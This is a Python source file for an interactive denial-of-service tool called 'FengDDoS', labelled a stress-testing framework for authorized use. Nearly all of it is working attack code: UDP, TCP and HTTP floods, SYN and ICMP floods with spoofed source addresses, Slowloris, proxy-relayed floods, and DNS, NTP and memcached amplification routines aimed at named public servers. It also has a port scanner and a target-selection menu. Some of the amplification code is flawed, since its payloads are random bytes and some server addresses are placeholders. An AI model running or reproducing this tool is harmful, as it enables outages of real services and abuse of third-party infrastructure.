import sys
import os
import time
import socket
import random
import threading
import json
import hashlib
import struct
from datetime import datetime
from socket import gethostbyname

try:
    from scapy.all import IP, TCP, ICMP, UDP, send, sr1, Raw
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

class color:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BG_RED = "\033[41m"
    BG_GREEN = "\033[42m"
    BG_BLUE = "\033[44m"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
]

class AttackStats:
    def __init__(self):
        self.total_sent = 0
        self.total_bytes = 0
        self.start_time = None
        self.lock = threading.Lock()
        self.running = False
        self.duration_limit = None
        self.bandwidth = 0
        self.peak_qps = 0
        self.errors = 0
        self.success = 0

    def increment(self, count=1, byte_count=0):
        with self.lock:
            self.total_sent += count
            self.total_bytes += byte_count

    def get_sent(self):
        with self.lock:
            return self.total_sent

    def get_bytes(self):
        with self.lock:
            return self.total_bytes

    def get_elapsed(self):
        if self.start_time:
            return time.time() - self.start_time
        return 0

    def get_qps(self):
        elapsed = self.get_elapsed()
        if elapsed > 1:
            qps = self.get_sent() / elapsed
            if qps > self.peak_qps:
                self.peak_qps = qps
            return qps
        return 0

    def get_bandwidth(self):
        elapsed = self.get_elapsed()
        if elapsed > 1:
            return self.get_bytes() / elapsed / 1024 / 1024
        return 0

    def check_duration(self):
        if self.duration_limit and self.get_elapsed() >= self.duration_limit:
            self.running = False
            return False
        return True

stats = AttackStats()

def show_banner():
    os.system("clear")
    info = system_info()
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    os.system("figlet FengDDoS")

    print(f"{color.CYAN}┌{'─' * 58}┐{color.RESET}")
    print(f"{color.CYAN}│{color.RESET} {color.BOLD}FengDDoS{color.RESET}  {color.MAGENTA}v0.6.0{color.RESET}  {color.DIM}Network Stress Testing Framework{color.RESET}")
    print(f"{color.CYAN}├{'─' * 58}┤{color.RESET}")

    scapy_flag = f"{color.GREEN}● AVAILABLE{color.RESET}" if SCAPY_AVAILABLE else f"{color.RED}● MISSING{color.RESET}"
    print(f"{color.CYAN}│{color.RESET} {color.DIM}TIME    :{color.RESET} {now}")
    print(f"{color.CYAN}│{color.RESET} {color.DIM}PLATFORM:{color.RESET} {info.get('platform', 'N/A')}")
    print(f"{color.CYAN}│{color.RESET} {color.DIM}PYTHON  :{color.RESET} {info.get('python', 'N/A')}")
    print(f"{color.CYAN}│{color.RESET} {color.DIM}PID     :{color.RESET} {info.get('pid', 'N/A')}")
    print(f"{color.CYAN}│{color.RESET} {color.DIM}SCAPY   :{color.RESET} {scapy_flag}")

    print(f"{color.CYAN}├{'─' * 58}┤{color.RESET}")
    print(f"{color.CYAN}│{color.RESET} {color.DIM}AUTHOR :{color.RESET} FengPwner")
    print(f"{color.CYAN}│{color.RESET} {color.DIM}GITHUB :{color.RESET} github.com/FengPwner")
    print(f"{color.CYAN}│{color.RESET} {color.DIM}ATOMGIT:{color.RESET} atomgit.com/FengPwner")
    print(f"{color.CYAN}│{color.RESET} {color.DIM}CSDN   :{color.RESET} blog.csdn.net/2302_76189356")
    print(f"{color.CYAN}└{'─' * 58}┘{color.RESET}")

    print(f"{color.RED}{color.BOLD}  ⚠  FOR AUTHORIZED TESTING ONLY - DO NOT USE ILLEGALLY  ⚠{color.RESET}\n")

def format_bytes(byte_count):
    if byte_count < 1024:
        return f"{byte_count} B"
    elif byte_count < 1024 * 1024:
        return f"{byte_count / 1024:.2f} KB"
    elif byte_count < 1024 * 1024 * 1024:
        return f"{byte_count / 1024 / 1024:.2f} MB"
    else:
        return f"{byte_count / 1024 / 1024 / 1024:.2f} GB"

def format_number(num):
    if num >= 1000000:
        return f"{num / 1000000:.1f}M"
    elif num >= 1000:
        return f"{num / 1000:.1f}K"
    return str(int(num))

def print_panel(title, content, color_code=color.CYAN):
    width = 60
    print(f"{color_code}┌{'─' * (width - 2)}┐{color.RESET}")
    print(f"{color_code}│{color.RESET} {color.BOLD}{title.center(width - 2)}{color.RESET} {color_code}│{color.RESET}")
    print(f"{color_code}├{'─' * (width - 2)}┤{color.RESET}")
    for line in content:
        padded = line.ljust(width - 2)
        print(f"{color_code}│{color.RESET} {padded} {color_code}│{color.RESET}")
    print(f"{color_code}└{'─' * (width - 2)}┘{color.RESET}")

def print_status_bar(stats_obj, target_ip, target_port, mode):
    elapsed = stats_obj.get_elapsed()
    sent = stats_obj.get_sent()
    qps = stats_obj.get_qps()
    bw = stats_obj.get_bandwidth()
    minutes = int(elapsed // 60)
    seconds = int(elapsed % 60)
    peak = stats_obj.peak_qps
    bar_width = 40
    progress = min(elapsed / 300, 1.0) if stats_obj.duration_limit else min(elapsed / 60, 1.0)
    filled = int(bar_width * progress)
    bar = "█" * filled + "░" * (bar_width - filled)
    status_line = (
        f"\r{color.CYAN}╔{'═' * 58}╗{color.RESET}\n"
        f"{color.CYAN}║{color.RESET} {color.BOLD}TARGET:{color.RESET} {target_ip}:{target_port}  {color.BOLD}MODE:{color.RESET} {mode.upper()}\n"
        f"{color.CYAN}║{color.RESET} {color.BOLD}TIME:{color.RESET} [{bar}] {minutes:02d}:{seconds:02d}\n"
        f"{color.CYAN}║{color.RESET} {color.GREEN}SENT:{color.RESET} {format_number(sent):>8} pkts  {color.GREEN}QPS:{color.RESET} {format_number(qps):>8}  {color.GREEN}PEAK:{color.RESET} {format_number(peak):>8}\n"
        f"{color.CYAN}║{color.RESET} {color.YELLOW}BW:{color.RESET} {bw:.2f} MB/s  {color.YELLOW}DATA:{color.RESET} {format_bytes(stats_obj.get_bytes()):>10}\n"
        f"{color.CYAN}╚{'═' * 58}╝{color.RESET}"
    )
    print(status_line, end="", flush=True)

def verify_packets(target_ip, target_port, interval=10):
    while stats.running:
        status = "UNKNOWN"
        detail = ""
        latency = 0
        if SCAPY_AVAILABLE:
            try:
                src_port = random.randint(1024, 65535)
                start = time.time()
                pkt = IP(dst=target_ip) / TCP(dport=target_port, sport=src_port, flags="S")
                resp = sr1(pkt, timeout=3, verbose=False)
                latency = (time.time() - start) * 1000
                if resp is None:
                    status = "NO_REPLY"
                    detail = "filtered/dropped"
                elif resp.haslayer(TCP):
                    flags = resp[TCP].flags
                    if flags & 0x12:
                        status = "OPEN"
                        detail = "SYN+ACK"
                    elif flags & 0x14:
                        status = "CLOSED"
                        detail = "RST"
                    else:
                        status = "REPLIED"
                        detail = f"flags={flags}"
                elif resp.haslayer(ICMP):
                    icmp_type = resp[ICMP].type
                    if icmp_type == 3:
                        status = "UNREACHABLE"
                        detail = "ICMP dest unreachable"
                    else:
                        status = "ICMP"
                        detail = f"type={icmp_type}"
                else:
                    status = "REPLIED"
                    detail = resp.summary()
            except Exception as e:
                status = "ERROR"
                detail = str(e)
        else:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                start = time.time()
                s.connect((target_ip, target_port))
                latency = (time.time() - start) * 1000
                status = "OPEN"
                detail = f"TCP connected"
                s.close()
            except ConnectionRefusedError:
                status = "CLOSED"
                detail = "connection refused"
            except socket.timeout:
                status = "TIMEOUT"
                detail = "no response"
            except OSError as e:
                status = "ERROR"
                detail = str(e)
        timestamp = datetime.now().strftime("%H:%M:%S")
        status_color = {
            "OPEN": color.GREEN,
            "CLOSED": color.YELLOW,
            "UNREACHABLE": color.RED,
            "TIMEOUT": color.YELLOW,
            "NO_REPLY": color.YELLOW,
            "ERROR": color.RED,
            "REPLIED": color.CYAN,
            "ICMP": color.MAGENTA,
        }.get(status, color.WHITE)
        print(f"\n{status_color}[{timestamp}] ◈ {target_ip}:{target_port} → {status} ({detail}) [{latency:.1f}ms]{color.RESET}")
        time.sleep(interval)

def udp_flood(target_ip, target_port, packet_size):
    while stats.running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(packet_size)
            s.sendto(payload, (target_ip, target_port))
            stats.increment(1, len(payload))
            s.close()
        except Exception:
            stats.errors += 1
        if not stats.check_duration(): break

def tcp_flood(target_ip, target_port, packet_size):
    while stats.running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ip, target_port))
            payload = random._urandom(packet_size)
            s.sendall(payload)
            stats.increment(1, len(payload))
            s.close()
        except Exception:
            stats.errors += 1
        if not stats.check_duration(): break

def syn_flood(target_ip, target_port, packet_size):
    if not SCAPY_AVAILABLE: return
    while stats.running:
        try:
            src_ip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
            src_port = random.randint(1024, 65535)
            packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S") / Raw(load=random._urandom(packet_size))
            send(packet, verbose=False)
            stats.increment(1, packet_size)
        except Exception:
            stats.errors += 1
        if not stats.check_duration(): break

def icmp_flood(target_ip, target_port, packet_size):
    if not SCAPY_AVAILABLE: return
    while stats.running:
        try:
            src_ip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
            packet = IP(src=src_ip, dst=target_ip) / ICMP() / Raw(load=random._urandom(packet_size))
            send(packet, verbose=False)
            stats.increment(1, packet_size)
        except Exception:
            stats.errors += 1
        if not stats.check_duration(): break

def http_flood(target_url, port, packet_size):
    while stats.running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target_url, port))
            ua = random.choice(USER_AGENTS)
            request = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {target_url}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                f"Accept-Language: en-US,en;q=0.5\r\n"
                f"Accept-Encoding: gzip, deflate\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
            )
            s.send(request.encode())
            stats.increment(1, len(request))
            s.close()
        except Exception:
            stats.errors += 1
        if not stats.check_duration(): break

def dns_amplification(target_ip, target_port, packet_size):
    if not SCAPY_AVAILABLE: return
    dns_servers = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "208.67.222.222"]
    while stats.running:
        try:
            src_ip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
            dns_server = random.choice(dns_servers)
            packet = IP(src=src_ip, dst=dns_server) / UDP(sport=random.randint(1024,65535), dport=53) / Raw(load=random._urandom(packet_size))
            send(packet, verbose=False)
            stats.increment(1, packet_size)
        except Exception:
            stats.errors += 1
        if not stats.check_duration(): break

def proxy_flood(target_ip, target_port, packet_size, proxy_list):
    while stats.running:
        try:
            proxy = random.choice(proxy_list)
            proxy_host, proxy_port = proxy.split(":")
            proxy_port = int(proxy_port)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((proxy_host, proxy_port))
            connect_request = f"CONNECT {target_ip}:{target_port} HTTP/1.1\r\nHost: {target_ip}:{target_port}\r\n\r\n"
            s.send(connect_request.encode())
            response = s.recv(1024)
            if b"200" in response:
                payload = random._urandom(packet_size)
                s.send(payload)
                stats.increment(1, len(payload))
            s.close()
        except Exception:
            stats.errors += 1
        if not stats.check_duration(): break

def slowloris_flood(target_ip, target_port, packet_size):
    while stats.running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target_ip, target_port))
            s.send(b"GET / HTTP/1.1\r\n")
            s.send(f"Host: {target_ip}\r\n".encode())
            s.send(b"User-Agent: Mozilla/5.0\r\n")
            s.send(b"Content-Length: 10000\r\n")
            s.send(b"Connection: keep-alive\r\n")
            time.sleep(0.1)
            s.send(b"X-a: b\r\n")
            stats.increment(1, 100)
            time.sleep(5)
            s.close()
        except Exception:
            stats.errors += 1
        if not stats.check_duration(): break

def ntp_amplification(target_ip, target_port, packet_size):
    if not SCAPY_AVAILABLE: return
    ntp_servers = ["129.6.15.28", "129.6.15.29", "132.163.4.101", "132.163.4.102"]
    while stats.running:
        try:
            src_ip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
            ntp_server = random.choice(ntp_servers)
            ntp_payload = b"\x17\x00\x03\x2a" + b"\x00" * 44
            packet = IP(src=src_ip, dst=ntp_server) / UDP(sport=random.randint(1024,65535), dport=123) / Raw(load=ntp_payload)
            send(packet, verbose=False)
            stats.increment(1, len(ntp_payload))
        except Exception:
            stats.errors += 1
        if not stats.check_duration(): break

def memcached_amplification(target_ip, target_port, packet_size):
    if not SCAPY_AVAILABLE: return
    while stats.running:
        try:
            src_ip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
            memcached_servers = ["1.1.1.1", "2.2.2.2"]
            server = random.choice(memcached_servers)
            packet = IP(src=src_ip, dst=server) / UDP(sport=random.randint(1024,65535), dport=11211) / Raw(load=b"\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n")
            send(packet, verbose=False)
            stats.increment(1, packet_size)
        except Exception:
            stats.errors += 1
        if not stats.check_duration(): break


def generate_random_payload(size):
    patterns = [
        lambda s: random._urandom(s),
        lambda s: b"A" * s,
        lambda s: b"\x00" * s,
        lambda s: (b"PAYLOAD" * (s // 7 + 1))[:s],
        lambda s: bytes([random.randint(0, 255) for _ in range(min(s, 4096))]),
    ]
    return random.choice(patterns)(size)

def load_config(config_file):
    try:
        with open(config_file, "r") as f:
            return json.load(f)
    except Exception:
        return {}

def save_log(entry):
    try:
        with open("attack_log.jsonl", "a") as f:
            f.write(json.dumps(entry) + "\n")
    except Exception:
        pass

def system_info():
    info = {}
    try:
        info["platform"] = sys.platform
        info["python"] = sys.version.split()[0]
        info["pid"] = os.getpid()
        info["scapy"] = "YES" if SCAPY_AVAILABLE else "NO"
    except Exception:
        pass
    return info

def port_scan(target_ip, ports, timeout=1):
    results = []
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            if s.connect_ex((target_ip, port)) == 0:
                results.append((port, "OPEN"))
            else:
                results.append((port, "CLOSED"))
            s.close()
        except Exception:
            results.append((port, "ERROR"))
    return results

def monitor_stats(target_ip, target_port, mode):
    while stats.running:
        print_status_bar(stats, target_ip, target_port, mode)
        time.sleep(1)

def run_attack(target_ip, target_port, mode, packet_size, threads, proxy_list=None, duration=None):
    stats.running = True
    stats.start_time = time.time()
    stats.duration_limit = duration
    stats.peak_qps = 0
    stats.errors = 0

    mode_map = {
        "udp": udp_flood,
        "tcp": tcp_flood,
        "syn": syn_flood,
        "icmp": icmp_flood,
        "http": http_flood,
        "dns": dns_amplification,
        "proxy": proxy_flood,
        "slowloris": slowloris_flood,
        "ntp": ntp_amplification,
        "memcached": memcached_amplification,
    }
    attack_func = mode_map.get(mode)
    if not attack_func:
        print(f"{color.RED}[-] Unknown attack mode: {mode}{color.RESET}")
        return
    if mode == "proxy" and not proxy_list:
        print(f"{color.RED}[-] Proxy mode requires a non-empty proxy list. Aborting.{color.RESET}")
        return

    monitor_thread = threading.Thread(target=monitor_stats, args=(target_ip, target_port, mode), daemon=True)
    monitor_thread.start()

    verify_thread = threading.Thread(target=verify_packets, args=(target_ip, target_port, 10), daemon=True)
    verify_thread.start()

    attack_threads = []
    for _ in range(threads):
        if mode == "proxy":
            t = threading.Thread(target=attack_func, args=(target_ip, target_port, packet_size, proxy_list))
        else:
            t = threading.Thread(target=attack_func, args=(target_ip, target_port, packet_size))
        t.daemon = True
        t.start()
        attack_threads.append(t)

    try:
        while stats.running:
            if not stats.check_duration():
                print(f"\n{color.YELLOW}[!] Duration limit reached ({duration}s), stopping.{color.RESET}")
                break
            time.sleep(0.5)
    except KeyboardInterrupt:
        print(f"\n{color.YELLOW}[!] Attack interrupted by user.{color.RESET}")

    stats.running = False
    for t in attack_threads:
        t.join(timeout=2)

    elapsed = stats.get_elapsed()
    sent = stats.get_sent()
    entry = {
        "time": datetime.now().isoformat(),
        "target": f"{target_ip}:{target_port}",
        "mode": mode,
        "threads": threads,
        "sent": sent,
        "bytes": stats.get_bytes(),
        "elapsed": elapsed,
        "errors": stats.errors,
        "peak_qps": stats.peak_qps,
    }
    save_log(entry)
    print(f"\n{color.GREEN}╔{'═' * 58}╗{color.RESET}")
    print(f"{color.GREEN}║{color.RESET} {color.BOLD}ATTACK SUMMARY{color.RESET}")
    print(f"{color.GREEN}║{color.RESET}  Total Sent : {format_number(sent)}")
    print(f"{color.GREEN}║{color.RESET}  Total Data : {format_bytes(stats.get_bytes())}")
    print(f"{color.GREEN}║{color.RESET}  Duration   : {elapsed:.1f}s")
    print(f"{color.GREEN}║{color.RESET}  Peak QPS   : {format_number(stats.peak_qps)}")
    print(f"{color.GREEN}║{color.RESET}  Errors     : {stats.errors}")
    print(f"{color.GREEN}╚{'═' * 58}╝{color.RESET}")

def handle_error(allow_edit=True):
    while True:
        if allow_edit:
            choice = input(f"{color.YELLOW}[?] Return to menu (y), Exit (n), or Edit (e): {color.RESET}").strip().lower()
            if choice == 'y': return 'y'
            elif choice == 'n':
                print(f"{color.GREEN}[*] Exiting script. Goodbye!{color.RESET}")
                sys.exit(0)
            elif choice == 'e': return 'e'
            else: print(f"{color.RED}[-] Invalid input. Please enter 'y', 'n', or 'e'.{color.RESET}")
        else:
            choice = input(f"{color.YELLOW}[?] Return to menu (y) or Exit (n): {color.RESET}").strip().lower()
            if choice == 'y': return 'y'
            elif choice == 'n':
                print(f"{color.GREEN}[*] Exiting script. Goodbye!{color.RESET}")
                sys.exit(0)
            else: print(f"{color.RED}[-] Invalid input. Please enter 'y' or 'n'.{color.RESET}")

def load_proxies(proxy_file):
    proxies = []
    try:
        with open(proxy_file, "r") as f:
            for line in f:
                line = line.strip()
                if line and ":" in line:
                    proxies.append(line)
    except FileNotFoundError:
        print(f"{color.RED}[-] Proxy file not found: {proxy_file}{color.RESET}")
    return proxies

def validate_proxies(proxy_list, timeout=2):
    valid = []
    print(f"{color.CYAN}[*] Validating {len(proxy_list)} proxies...{color.RESET}")
    for p in proxy_list:
        try:
            host, port = p.split(":")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            if s.connect_ex((host, int(port))) == 0:
                valid.append(p)
            s.close()
        except Exception:
            pass
    print(f"{color.GREEN}[+] {len(valid)} / {len(proxy_list)} proxies are alive.{color.RESET}")
    return valid

def main():
    while True:
        show_banner()
        info = system_info()
        print_panel("SYSTEM INFO", [
            f"Platform : {info.get('platform', 'N/A')}",
            f"Python   : {info.get('python', 'N/A')}",
            f"PID      : {info.get('pid', 'N/A')}",
            f"Scapy    : {info.get('scapy', 'N/A')}",
        ])
        try:
            while True:
                target = input(f"{color.BLUE}[1/5] IP or Domain (type 'exit' to quit): {color.RESET}")
                if target.strip().lower() == 'exit':
                    print(f"{color.GREEN}[*] Exiting script. Goodbye!{color.RESET}")
                    sys.exit(0)
                try:
                    target_ip = gethostbyname(target)
                    print(f"{color.GREEN}[+] Resolved target to IP: {target_ip}{color.RESET}")
                    break
                except socket.gaierror:
                    print(f"{color.RED}[-] Error: Could not resolve the specified IP or Domain.{color.RESET}")
                    action = handle_error(allow_edit=True)
                    if action == 'y': break
                    elif action == 'e': continue
            if 'target_ip' not in locals(): continue

            while True:
                port_input = input(f"{color.BLUE}[2/5] Port (1-65535, type 'exit' to quit): {color.RESET}")
                if port_input.strip().lower() == 'exit':
                    print(f"{color.GREEN}[*] Exiting script. Goodbye!{color.RESET}")
                    sys.exit(0)
                try:
                    target_port = int(port_input)
                    if not (1 <= target_port <= 65535): raise ValueError("Port out of range")
                    break
                except ValueError:
                    print(f"{color.RED}[-] Error: Invalid port. Please enter a number between 1 and 65535.{color.RESET}")
                    action = handle_error(allow_edit=True)
                    if action == 'y': break
                    elif action == 'e': continue
            if 'target_port' not in locals(): continue

            scan_choice = input(f"{color.BLUE}[?] Quick port scan on target? (y/n): {color.RESET}").strip().lower()
            if scan_choice == 'y':
                print(f"{color.CYAN}[*] Scanning common ports...{color.RESET}")
                results = port_scan(target_ip, [21, 22, 23, 53, 80, 443, 3306, 3389, 8080])
                print_panel("PORT SCAN", [f"{p:<8} {s}" for p, s in results], color.MAGENTA)

            while True:
                print(f"{color.CYAN}Available modes: udp, tcp, syn, icmp, http, dns, proxy, slowloris, ntp, memcached{color.RESET}")
                mode = input(f"{color.BLUE}[3/5] Attack mode (type 'exit' to quit): {color.RESET}").strip().lower()
                if mode == 'exit':
                    print(f"{color.GREEN}[*] Exiting script. Goodbye!{color.RESET}")
                    sys.exit(0)
                if mode in ["udp","tcp","syn","icmp","http","dns","proxy","slowloris","ntp","memcached"]:
                    break
                else:
                    print(f"{color.RED}[-] Invalid mode.{color.RESET}")
                    action = handle_error(allow_edit=True)
                    if action == 'y': break
                    elif action == 'e': continue
            if mode not in ["udp","tcp","syn","icmp","http","dns","proxy","slowloris","ntp","memcached"]: continue

            proxy_list = None
            if mode == "proxy":
                proxy_file = input(f"{color.BLUE}[+] Proxy file path (ip:port per line): {color.RESET}").strip()
                proxy_list = load_proxies(proxy_file)
                if proxy_list:
                    check = input(f"{color.BLUE}[?] Validate proxies before starting? (y/n): {color.RESET}").strip().lower()
                    if check == 'y':
                        proxy_list = validate_proxies(proxy_list)
                if not proxy_list:
                    print(f"{color.RED}[-] No valid proxies loaded, falling back to tcp mode.{color.RESET}")
                    mode = "tcp"

            while True:
                t_input = input(f"{color.BLUE}[4/5] Threads (1~10000, type 'exit' to quit): {color.RESET}")
                if t_input.strip().lower() == 'exit':
                    print(f"{color.GREEN}[*] Exiting script. Goodbye!{color.RESET}")
                    sys.exit(0)
                try:
                    threads = int(t_input)
                    if not (1 <= threads <= 10000): raise ValueError("Threads out of range")
                    break
                except ValueError:
                    print(f"{color.RED}[-] Error: Invalid threads. Please enter a number between 1 and 10000.{color.RESET}")
                    action = handle_error(allow_edit=True)
                    if action == 'y': break
                    elif action == 'e': continue
            if 'threads' not in locals(): continue

            while True:
                d_input = input(f"{color.BLUE}[5/5] Duration in seconds (0 = unlimited): {color.RESET}")
                try:
                    duration = int(d_input)
                    if duration < 0: raise ValueError
                    break
                except ValueError:
                    print(f"{color.RED}[-] Invalid duration, please enter a non-negative integer.{color.RESET}")
            if 'duration' not in locals(): duration = 0

            os.system("clear")
            print(f"{color.CYAN}{color.BOLD}[*] Attack started... Press Ctrl+C to stop.{color.RESET}\n")
            print(f"{color.YELLOW}[*] Packet verification runs every 10 seconds.{color.RESET}\n")
            run_attack(target_ip, target_port, mode, 64, threads, proxy_list, duration if duration > 0 else None)
            handle_error(allow_edit=False)
        except Exception as e:
            print(f"{color.RED}[!] Error: {e}{color.RESET}")
            time.sleep(2)

if __name__ == "__main__":
    main()
